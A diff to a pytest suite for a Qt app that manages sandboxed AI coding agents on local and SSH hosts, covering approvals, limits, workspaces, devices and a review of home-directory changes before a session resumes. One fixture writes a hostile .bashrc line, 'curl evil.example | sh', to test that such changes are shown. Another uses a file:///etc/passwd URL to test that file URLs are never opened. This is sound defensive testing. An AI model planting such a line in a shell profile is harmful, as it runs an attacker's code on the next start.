@@ -302,8 +302,8 @@ def test_sandboxes_lists_and_manages_the_other_hosts_starts(window, wait, monkey
     each row naming its host; pause, resume, stop, delete and attach run on that host (sandbox-ai there), each
     confirmation naming it; what a run may reach stays with that host; a host that does not answer is said."""
     page = window.sandboxes
-    there = backend.Instance("session", "ct1:web", "web", project="/srv/app", agent="codex", state="running",
-                             record={"attachable": True}, host="ct1")
+    there = backend.Instance("session", backend.remote_key("ct1", "web"), "web", project="/srv/app", agent="codex",
+                             state="running", record={"attachable": True}, host="ct1")
     monkeypatch.setattr(window.sai, "remote_hosts", lambda: ["ct1", "ct2"])
     monkeypatch.setattr(window.sai, "host_instances",
                         lambda name, timeout=60: [there] if name == "ct1" else (_ for _ in ()).throw(
@@ -319,7 +319,19 @@ def test_sandboxes_lists_and_manages_the_other_hosts_starts(window, wait, monkey
     page.table.selectRow(0)
     assert "On ct1" in page.detail.text()
     assert page.stop_button.isEnabled() and page.session_buttons["pause"].isEnabled()
-    assert not page.session_buttons["resume"].isEnabled() and not any(b.isEnabled() for b in page.run_buttons)
+    assert not page.session_buttons["resume"].isEnabled()
+    # While it runs, what it may reach, its workspaces, devices and limits are changed there; its log is there.
+    assert all(b.isEnabled() for key, b in page.run_named.items() if key != "log")
+    assert not page.run_named["log"].isEnabled() and "ct1" in page.run_named["log"].toolTip()
+    # The Host filter: all, this machine, each host.
+    assert page.host_filter.isVisibleTo(page)
+    assert [page.host_filter.itemData(i) for i in range(page.host_filter.count())] == [None, "local", "ct1", "ct2"]
+    page.host_filter.setCurrentIndex(page.host_filter.findData("local"))
+    assert page.table.rowCount() == 0
+    page.host_filter.setCurrentIndex(page.host_filter.findData("ct1"))
+    assert page.table.rowCount() == 1 and page.table.item(0, 8).text() == "ct1"
+    page.host_filter.setCurrentIndex(0)
+    page.table.selectRow(0)
     page.session("attach")
     assert opened == [(["ssh", "-tt", "ct1", "attach", "web"], "ct1: web")]
     page.session("pause")
@@ -1643,8 +1655,8 @@ def test_devices_and_limits_of_a_running_sandbox(window, env, monkeypatch, wait)
             return "/dev/video1"
 
     class FakeLimits:
-        def __init__(self, parent, run):
-            pass
+        def __init__(self, parent, run, host="local", current=None, note=None):
+            shown.append(("limits", host, current))
 
         def exec(self):
             return QtWidgets.QDialog.DialogCode.Accepted
@@ -1653,6 +1665,8 @@ def test_devices_and_limits_of_a_running_sandbox(window, env, monkeypatch, wait)
             return "4g", "", "none"
     monkeypatch.setattr(ui, "DeviceDialog", FakeDevices)
     monkeypatch.setattr(ui, "LimitsDialog", FakeLimits)
+    monkeypatch.setattr(window.sai, "limits_shown", lambda run, host="local": {"memory": 8 << 30, "memory_high": None,
+                                                                               "cpus": None, "pids": 512})
     page.add_device()
     assert wait(lambda: calls, 20) and calls[0] == ("add", "claude-abc", "/dev/video1")
     assert shown[0][1][1] == "raw memory", "refused devices are listed with the launcher's reason"
@@ -1662,6 +1676,8 @@ def test_devices_and_limits_of_a_running_sandbox(window, env, monkeypatch, wait)
     assert wait(lambda: len(calls) == 2, 20) and calls[1] == ("remove", "claude-abc", "/dev/video0")
     page.limits()
     assert wait(lambda: len(calls) == 3, 20) and calls[2] == ("limits", "claude-abc", ("4g", "", "none"))
+    assert shown[-1] == ("limits", "local", {"memory": 8 << 30, "memory_high": None, "cpus": None, "pids": 512}), \
+        "the dialog is filled with the limits it has now"
 
 
 def test_workspaces_of_a_running_sandbox(window, env, monkeypatch, wait):
@@ -1677,7 +1693,8 @@ def test_workspaces_of_a_running_sandbox(window, env, monkeypatch, wait):
     assert "/work " not in page.workspaces_label.text(), "only the added ones"
     calls = []
     monkeypatch.setattr(window.sai, "add_workspace", lambda run, d, ro: calls.append(("add", run, d, ro)) or (0, "", ""))
-    answers = iter([(1, "", "sandbox-ai workspace: busy. Let the agent leave it, or --force"), (0, "removed", "")])
+    refusal = "sandbox-ai workspace: /workspaces/docs is in use by a process (1234 claude); --force detaches it"
+    answers = iter([(1, "", refusal), (0, "removed", "")])
     monkeypatch.setattr(window.sai, "remove_workspace",
                         lambda run, value, force: calls.append(("remove", run, value, force)) or next(answers))
 
@@ -1700,6 +1717,7 @@ def test_workspaces_of_a_running_sandbox(window, env, monkeypatch, wait):
     assert wait(lambda: len(calls) == 3, 20), calls
     assert calls[1] == ("remove", "claude-abc", "/workspaces/docs", False)
     assert calls[2] == ("remove", "claude-abc", "/workspaces/docs", True), "busy: asked, then forced"
+    assert any(refusal in text for _, text, _ in widgets.SHOWN), "the question quotes sandbox-ai's own refusal"
 
 
 def test_the_board_applies_devices_and_limits_live(window, env, monkeypatch, wait):
@@ -1916,3 +1934,320 @@ def test_rule_questions_say_what_they_ask(language):
                                                  "device": "device", "canary": "canary"}[kind])
     assert pages.describe({"kind": "mcp", "arguments": "x" * 1000}).count("x") < 400, "shortened"
     i18n.set_language("en")
+
+
+# -- other hosts: their questions, their running starts, their kept HOMEs --
+
+
+def remote_question(host="ct1", **item):
+    return backend.RemoteQuestion(host, {"run": "claude-r", "sandbox": "claude-r (~/srv)", "timeout": 60,
+                                         "seconds_left": 40, "max_scope": "always", **item})
+
+
+def test_approvals_of_every_host_are_one_table_answered_on_their_host(window, env, monkeypatch, wait):
+    """The other hosts' open questions are read in threads (one read per host at a time), listed with this machine's,
+    keyed by (host, run, id), with a Host column and their own time left; answers go to their host over SSH; new ones
+    are announced like this machine's; a host that does not answer is said."""
+    from sandbox_ai_app import pages
+    run = fake_run(env)
+    ask(run, "1700000000-1-1", kind="dns", name="pypi.org")
+    reads, ran, opened, notes = [], [], [], []
+    questions = {"ct1": [remote_question(id="1700000000-1-1", kind="connect", question="connect to 192.0.2.7:443",
+                                         max_scope="run"),
+                         remote_question(id="1700000000-1-2", kind="browser", question="open a page",
+                                         url="https://login.example/device?code=1"),
+                         remote_question(id="1700000000-1-3", kind="browser", question="open a file",
+                                         url="file:///etc/passwd")]}
+
+    def host_questions(name, timeout=30):
+        reads.append(name)
+        if name == "ct2":
+            raise ValueError("ssh: connect to host 192.0.2.11 port 22: Connection timed out")
+        return list(questions[name])
+    monkeypatch.setattr(window.sai, "remote_hosts", lambda: ["ct1", "ct2"])
+    monkeypatch.setattr(window.sai, "host_questions", host_questions)
+    monkeypatch.setattr(window.sai, "host_run", lambda name, *args, timeout=120: ran.append((name, args)) or (0, "ok", ""))
+    monkeypatch.setattr(pages.QDesktopServices, "openUrl", lambda url: opened.append(url.toString()) or True)
+    window.notify = lambda title, text, **_: notes.append((title, text))
+    page = window.approvals
+    page.poll()
+    page.poll_remote()
+    assert wait(lambda: page.open.rowCount() == 4 and "ct2" in page.remote_note.text(), 15)
+    hosts = [page.open.item(r, 5).text() for r in range(4)]
+    assert hosts.count("this machine") == 1 and hosts.count("ct1") == 3
+    assert "on every host" in page.open_box.title() and "(3 on other hosts)" in page.open_box.title()
+    assert window.nav_item("approvals").text() == "Approvals  (4)"
+    assert "every host" in window.nav_item("approvals").toolTip()
+    assert any("on ct1" in title for title, _ in notes), "a new question of another host is announced too"
+    count = len(notes)
+    page.poll_remote()
+    assert wait(lambda: reads.count("ct1") >= 2, 15) and len(notes) == count, "announced once"
+    connect = widgets.find_row(page.open, ("ct1", "claude-r", "1700000000-1-1"))
+    left = int(page.open.item(connect, 4).text().split()[0])
+    assert 30 <= left <= 40, "counted down from the host's own time left"
+    assert page.open.item(connect, 2).text() == "connect to 192.0.2.7:443"
+    page.open.selectRow(connect)
+    assert not page.scope.model().item(page.scope.findData("always")).isEnabled(), "that host's widest answer"
+    page.scope.setCurrentIndex(page.scope.findData("run"))
+    widgets.SHOWN.clear()
+    page.answer("allow")
+    title, text, _ = widgets.SHOWN[-1]
+    assert title == "Allow this request?" and "Host: ct1" in text and "claude-r (~/srv) on ct1" in text
+    assert wait(lambda: page.answering is None, 15)
+    assert ("ct1", ("approvals", "allow", "1700000000-1-1", "--scope", "run")) in ran
+    reads_before = reads.count("ct1")
+    assert wait(lambda: reads.count("ct1") > reads_before, 15), "read again at once after an answer there"
+    # A browser question of another host: opened here (http/https only), allowed there without opening it.
+    page.open.selectRow(widgets.find_row(page.open, ("ct1", "claude-r", "1700000000-1-2")))
+    assert page.open_here_button.isVisibleTo(page.open_box) and "ct1" in page.url.text()
+    page.open_here()
+    assert wait(lambda: page.answering is None, 15)
+    assert ("ct1", ("approvals", "allow", "1700000000-1-2", "--scope", "once", "--no-open")) in ran
+    assert opened == ["https://login.example/device?code=1"]
+    page.open.selectRow(widgets.find_row(page.open, ("ct1", "claude-r", "1700000000-1-3")))
+    assert not page.open_here_button.isVisibleTo(page.open_box)
+    count = len(ran)
+    page.open_here()
+    assert len(ran) == count and opened == ["https://login.example/device?code=1"], "a file: URL is never opened"
+    # This machine's question is answered here, as before.
+    page.open.selectRow(widgets.find_row(page.open, ("local", "claude-abc", "1700000000-1-1")))
+    page.answer("deny")
+    assert wait(lambda: page.answering is None, 90)
+    assert (run / "approvals" / "1700000000-1-1.answer").exists()
+    assert not [args for _, args in ran if args[:2] == ("approvals", "deny")]
+    # A host that is gone from the list takes its questions with it.
+    monkeypatch.setattr(window.sai, "remote_hosts", lambda: [])
+    page.poll_remote()
+    assert wait(lambda: not page.remote and page.open.rowCount() == 0, 15)
+
+
+def test_a_running_start_on_another_host_is_changed_there(window, monkeypatch, wait):
+    """Allow, Revoke, Allowed, workspaces, devices and limits of a start on another host run as sandbox-ai there
+    (`sandbox-ai hosts run HOST -- ...`); every dialog and question names the host; its folders and devices are typed
+    in (nothing of this computer is offered); the limits dialog shows the limits it has now."""
+    from sandbox_ai_app import ui
+    page = window.sandboxes
+    there = backend.Instance("run", backend.remote_key("ct1", "web"), "web", project="/srv/app", agent="claude",
+                             state="running", record={}, host="ct1")
+    monkeypatch.setattr(window.sai, "remote_hosts", lambda: ["ct1"])
+    monkeypatch.setattr(window.sai, "host_instances", lambda name, timeout=60: [there])
+    ran, seen = [], []
+    refusal = ("sandbox-ai workspace: /srv/data is in use by a process (321 python) in web; --force detaches it "
+               "(what is open there stays usable)")
+    answers = {("limits", "web", "--show", "--json"): (0, json.dumps({"memory": 8 << 30, "memory_high": 6 << 30,
+                                                                      "cpus": 2, "pids": None}), ""),
+               ("workspace", "remove", "web", "/srv/data"): (1, "", refusal)}
+    monkeypatch.setattr(window.sai, "host_run", lambda name, *args, timeout=120: ran.append((name, args)) or
+                        answers.get(tuple(args), (0, "done", "")))
+
+    class FakeNetwork:
+        def __init__(self, parent, presets, title, supported=None):
+            seen.append(("net", title, set(supported or ())))
+
+        def exec(self):
+            return QtWidgets.QDialog.DialogCode.Accepted
+
+        def arguments(self):
+            return ["--allow-host", "pypi.org"]
+
+    class FakeWorkspace:
+        def __init__(self, parent, run, host="local"):
+            seen.append(("workspace", run, host))
+            self.read_only = QtWidgets.QCheckBox()
+
+        def exec(self):
+            return QtWidgets.QDialog.DialogCode.Accepted
+
+        def directory(self):
+            return "/srv/data"
+
+    class FakeDevices:
+        def __init__(self, parent, candidates, title=None):
+            seen.append(("device", candidates, title))
+
+        def exec(self):
+            return QtWidgets.QDialog.DialogCode.Accepted
+
+        def path(self):
+            return "/dev/ttyUSB0"
+
+    class FakeLimits:
+        def __init__(self, parent, run, host="local", current=None, note=None):
+            seen.append(("limits", host, current))
+
+        def exec(self):
+            return QtWidgets.QDialog.DialogCode.Accepted
+
+        def values(self):
+            return "4g", "", ""
+    for name, fake in (("NetworkDialog", FakeNetwork), ("WorkspaceDialog", FakeWorkspace),
+                       ("DeviceDialog", FakeDevices), ("LimitsDialog", FakeLimits)):
+        monkeypatch.setattr(ui, name, fake)
+    monkeypatch.setattr(QtWidgets.QInputDialog, "getText", lambda *a, **k: ("/srv/data", True))
+    page.refresh_remote()
+    assert wait(lambda: page.table.rowCount() == 1, 15)
+    page.table.selectRow(0)
+
+    def done(*args):
+        assert wait(lambda: ("ct1", args) in ran and not widgets.busy(page), 15), (args, ran)
+    page.network("allow")
+    done("net", "allow", "web", "--allow-host", "pypi.org")
+    assert seen[-1][1] == "Allow for web on ct1" and "--allow-host-port" not in seen[-1][2]
+    page.network("revoke")
+    done("net", "revoke", "web", "--allow-host", "pypi.org")
+    page.show_allowed()
+    done("net", "show", "web")
+    assert any(title == "web on ct1" for title, *_ in widgets.SHOWN)
+    widgets.SHOWN.clear()
+    page.add_workspace()
+    done("workspace", "add", "web", "/srv/data")
+    assert seen[-1] == ("workspace", "web", "ct1") and "on ct1" in widgets.SHOWN[0][1], "a writable add is asked first"
+    widgets.SHOWN.clear()
+    page.remove_workspace()
+    done("workspace", "remove", "web", "/srv/data", "--force")
+    assert refusal in widgets.SHOWN[0][1], "the question quotes sandbox-ai's own refusal"
+    page.add_device()
+    done("devices", "add", "web", "/dev/ttyUSB0")
+    assert seen[-1] == ("device", [], "Add device to web on ct1"), "that host's devices: typed in"
+    page.remove_device()
+    monkeypatch.setattr(QtWidgets.QInputDialog, "getText", lambda *a, **k: ("/dev/ttyUSB0", True))
+    page.remove_device()
+    done("devices", "remove", "web", "/dev/ttyUSB0")
+    page.limits()
+    done("limits", "web", "--memory", "4g")
+    assert seen[-1] == ("limits", "ct1", {"memory": 8 << 30, "memory_high": 6 << 30, "cpus": 2, "pids": None})
+
+
+def test_the_limits_and_workspace_dialogs_of_another_host(qapp):
+    from sandbox_ai_app import ui
+    dialog = ui.LimitsDialog(None, "web", host="ct1", current={"memory": 8 << 30, "memory_high": 6 << 30, "cpus": 1.5,
+                                                               "pids": None})
+    assert dialog.windowTitle() == "Limits of web on ct1"
+    assert (dialog.memory.text(), dialog.cpus.text(), dialog.pids.text()) == ("8g", "1.5", "")
+    assert dialog.values() == ("", "", ""), "what it has now is not set again"
+    dialog.memory.setText("4g")
+    dialog.pids.setText("none")
+    assert dialog.values() == ("4g", "", "none")
+    assert any("6g" in label.text() for label in dialog.findChildren(QtWidgets.QLabel)), "memory.high is shown"
+    dialog.deleteLater()
+    assert ui.size_text(512 << 20) == "512m" and ui.size_text(1000) == "1000"
+    dialog = ui.WorkspaceDialog(None, "web", host="ct1")
+    assert dialog.windowTitle() == "Add workspace to web on ct1"
+    assert not [b for b in dialog.findChildren(QtWidgets.QPushButton) if b.text() == "Choose…"], \
+        "this computer's folders are not offered for another host"
+    dialog.deleteLater()
+    dialog = ui.WorkspaceDialog(None, "claude-abc")
+    assert [b for b in dialog.findChildren(QtWidgets.QPushButton) if b.text() == "Choose…"]
+    dialog.deleteLater()
+
+
+def test_an_action_on_another_host_reads_its_starts_again_even_while_a_read_runs(window, monkeypatch, wait):
+    """Regression: refresh_remote() returned at once while a read was running, so the starts after an action showed
+    what was read before it until the next minute."""
+    import threading
+    page = window.sandboxes
+    release, reads = threading.Event(), []
+
+    def host_instances(name, timeout=60):
+        reads.append(name)
+        release.wait(10)
+        return [backend.Instance("session", backend.remote_key(name, "web"), "web", state="running", host=name)]
+    monkeypatch.setattr(window.sai, "remote_hosts", lambda: ["ct1"])
+    monkeypatch.setattr(window.sai, "host_instances", host_instances)
+    page.refresh_remote()
+    assert wait(lambda: reads == ["ct1"], 10)
+    page.refresh_remote()  # e.g. after a pause there: queued, not dropped
+    assert page.remote_again
+    release.set()
+    assert wait(lambda: len(reads) == 2 and page.remote_reading is None, 15)
+    assert not page.remote_again
+
+
+def test_resuming_a_stopped_kept_start_shows_what_changed_in_its_home(window, monkeypatch, wait):
+    """Whatever wrote into a kept HOME (the agent too) runs at its next start: a stopped session's changes are shown
+    (sandbox-ai resume NAME --review-home --json, in the background) before it is resumed, on this machine and on
+    another host; nothing changed, or a start without a HOME, resumes at once."""
+    page = window.sandboxes
+    here = backend.Instance("session", "session:work", "work", session="work", state="stopped")
+    there = backend.Instance("session", backend.remote_key("ct1", "web"), "web", state="stopped", host="ct1")
+    monkeypatch.setattr(window.sai, "instances", lambda: ([here], []))
+    monkeypatch.setattr(window.sai, "remote_hosts", lambda: ["ct1"])
+    monkeypatch.setattr(window.sai, "host_instances", lambda name, timeout=60: [there])
+    calls, ran, reviewed = [], [], []
+    changed = {"name": "work", "state": "stopped", "pending": True,
+               "review": {"since": "2026-11-07T10:00:00Z", "complete": True,
+                          "changes": [{"path": ".bashrc", "change": "changed", "diff": "+curl evil.example | sh"}]}}
+    reviews = {"work": changed, "web": changed}
+
+    def review_home(name, host="local"):
+        reviewed.append((name, host))
+        found = reviews[name]
+        if isinstance(found, Exception):
+            raise found
+        return found
+    monkeypatch.setattr(window.sai, "review_home", review_home)
+    monkeypatch.setattr(window.sai, "call", lambda *args, timeout=120, input=None: calls.append(args) or (0, "", ""))
+    monkeypatch.setattr(window.sai, "host_run", lambda name, *args, timeout=120: ran.append((name, args)) or (0, "", ""))
+    page.refresh()
+    page.refresh_remote()
+    assert wait(lambda: page.table.rowCount() == 2, 15)
+    page.table.selectRow(widgets.find_row(page.table, "session:work"))
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)  # Cancel
+    widgets.SHOWN.clear()
+    page.session("resume")
+    assert wait(lambda: widgets.SHOWN and not widgets.busy(page), 15)
+    title, text, details = widgets.SHOWN[-1]
+    assert title == "Resume work" and ".bashrc" in text and "evil.example" in details
+    assert ("session", "resume", "work") not in calls, "declined: not resumed"
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.session("resume")
+    assert wait(lambda: ("session", "resume", "work") in calls, 15)
+    # Nothing changed, or nothing to review: resumed without a question.
+    reviews["work"] = {**changed, "review": {**changed["review"], "changes": []}}
+    calls.clear()
+    widgets.SHOWN.clear()
+    page.session("resume")
+    assert wait(lambda: ("session", "resume", "work") in calls, 15) and not widgets.SHOWN
+    reviews["work"] = ValueError("sandbox-ai: work keeps no HOME: there is nothing to review")
+    calls.clear()
+    page.session("resume")
+    assert wait(lambda: ("session", "resume", "work") in calls, 15) and not widgets.SHOWN
+    # Another host's: reviewed there, the question names the host.
+    page.table.selectRow(widgets.find_row(page.table, backend.remote_key("ct1", "web")))
+    page.session("resume")
+    assert wait(lambda: ("ct1", ("resume", "web")) in ran, 15)
+    assert ("web", "ct1") in reviewed and widgets.SHOWN[-1][0] == "Resume web on ct1"
+
+
+def test_deleting_a_session_asks_with_cancel_as_the_default(window, monkeypatch, wait):
+    page = window.sandboxes
+    stopped = backend.Instance("session", "session:work", "work", session="work", state="stopped")
+    monkeypatch.setattr(window.sai, "instances", lambda: ([stopped], []))
+    calls = []
+    monkeypatch.setattr(window.sai, "call", lambda *args, timeout=120, input=None: calls.append(args) or (0, "", ""))
+    page.refresh()
+    page.table.selectRow(0)
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)
+    page.session("delete")
+    assert "on this machine" in widgets.SHOWN[-1][1] and not [c for c in calls if c[:2] == ("session", "delete")]
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.session("delete")
+    assert wait(lambda: ("session", "delete", "work", "--yes") in calls, 15)
+
+
+def test_the_question_count_in_the_strip_of_icons(window):
+    """Regression: the count of open questions put the title back on the Approvals entry in the strip of icons; the
+    strip's entries had no accessible names."""
+    rows = window.nav_rows
+    window.questions_changed(2, [])
+    window.set_compact_nav(True)
+    item = window.nav.item(rows["approvals"])
+    assert item.text() == "" and "2 open questions" in item.toolTip()
+    window.questions_changed(3, [])
+    assert item.text() == "", "still a strip of icons"
+    assert "3 open questions" in item.data(Qt.ItemDataRole.AccessibleTextRole)
+    assert window.nav.item(rows["files"]).data(Qt.ItemDataRole.AccessibleTextRole) == "Files"
+    window.set_compact_nav(False)
+    assert item.text() == "Approvals  (3)" and item.toolTip().startswith("Approvals (Ctrl+")
+    window.questions_changed(0, [])
+    assert item.text() == "Approvals" and item.toolTip() == window.nav_tooltip("approvals")
